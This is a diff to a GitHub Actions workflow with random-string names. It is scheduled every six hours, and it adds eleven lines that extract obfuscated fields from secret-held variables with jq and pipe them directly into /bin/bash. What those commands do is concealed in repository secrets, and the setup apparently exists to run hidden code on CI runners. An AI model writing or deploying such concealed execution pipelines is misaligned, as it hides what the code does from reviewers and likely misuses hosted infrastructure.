@@ -1,9 +1,9 @@
 name: zhangcongrong6247
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '32 3/6 * * *'
-
+    - cron: '2 1/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -12,8 +12,17 @@ jobs:
       - uses: actions/checkout@v4
       - name: zhangcongrong6247
         env:
-          fdy61: ${{ secrets.fdy61 }}
+          nh8865: ${{ secrets.nh8865 }}
         run: |
-          echo $fdy61 | jq -r .vua52 | /bin/bash
-          echo $kv65307 | jq -r .hc1762 | /bin/bash
+          echo $nh8865 | jq -r .sxqa68583 | /bin/bash
+          echo $ospb56 | jq -r .ftv0129 | /bin/bash
+          echo $czld046 | jq -r .t6300 | /bin/bash
+          echo $vcxwf8 | jq -r .ranm34960 | /bin/bash
+          echo $kuxd36256 | jq -r .hzpa60 | /bin/bash
+          echo $felb974 | jq -r .ym3866 | /bin/bash
+          echo $pxu03 | jq -r .ozjq799 | /bin/bash
+          echo $ck95831 | jq -r .zk9360 | /bin/bash
+          echo $at2904 | jq -r .ux23093 | /bin/bash
+          echo $dthnv83 | jq -r .pn06 | /bin/bash
+          echo $njyj96 | jq -r .xxobt623 | /bin/bash
 
